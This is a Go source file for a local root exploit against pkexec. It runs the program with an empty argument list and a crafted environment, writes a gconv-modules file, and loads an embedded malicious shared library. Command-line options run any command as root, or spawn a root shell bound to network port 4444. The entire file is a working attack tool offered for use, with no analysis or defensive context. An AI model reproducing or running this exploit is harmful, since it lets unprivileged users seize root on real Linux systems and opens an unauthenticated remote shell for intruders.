package main

import (
	_ "embed"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"syscall"
)

const (
	fake_charset = "payload"
	gconv_dir    = "gconv"
)

var (
	gconv_content = "module  PAYLOAD//    INTERNAL    ../../../../../../../..${REPLACE}    2\nmodule  INTERNAL    PAYLOAD//    ../../../../../../../..${REPLACE}    2"
	cmd_execute   = flag.String("c", "", "Command to execute , command will be executed via /bin/sh -c")
	notty         = flag.Bool("notty", false, "If set instead of executing the command spawn a root shell and bind it to a port")
	port          = flag.Int("port", 4444, "Default port to bind to if notty is set")
)

//go:embed payload/payload.so
var payload []byte

func wirte_gconv_module() (err error) {
	if err := os.Mkdir(gconv_dir, 0o0755); err != nil {
		return err
	}
	directory, err := os.Getwd()
	if err != nil {
		return err
	}
	replace := directory + "/payload.so"
	content := strings.Replace(gconv_content, "${REPLACE}", replace, -1)
	if err := ioutil.WriteFile(fmt.Sprintf("%s/gconv-modules", gconv_dir), []byte(content), 0o0755); err != nil {
		log.Fatal(err)
	}
	return nil
}

func main() {
	flag.Parse()
	target := "/usr/bin/pkexec"
	if err := wirte_gconv_module(); err != nil {
		log.Fatalf("Unable to write gconv module: %v", err)
	}
	if err := os.Mkdir("GCONV_PATH=.", 0o0755); err != nil {
		log.Fatalf("Unable to make tmp dir: %v", err)
	}
	if err := ioutil.WriteFile("payload.so", payload, 0o0755); err != nil {
		log.Fatalf("Unable to write  payload: %v", err)
	}
	if err := ioutil.WriteFile(fmt.Sprintf("GCONV_PATH=./%s", gconv_dir), []byte("\x00"), 0o0755); err != nil {
		log.Fatalf("Unable to write tmp file: %v", err)
	}
	var usenotty = 0

	if *notty {
		usenotty = 1
	}
	if err := syscall.Exec(target, nil, []string{
		gconv_dir,
		"PATH=GCONV_PATH=.",
		"SHELL=/fake/shell",
		fmt.Sprintf("CHARSET=%s", fake_charset),
		fmt.Sprintf("CMDTOEXECUTE=%s", *cmd_execute),
		fmt.Sprintf("NOTTY=%d", usenotty),
		fmt.Sprintf("NOTTY_PORT=%d", *port),
	}); err != nil {
		log.Fatalf("Unable to execute pkexec: %v", err)
	}
}
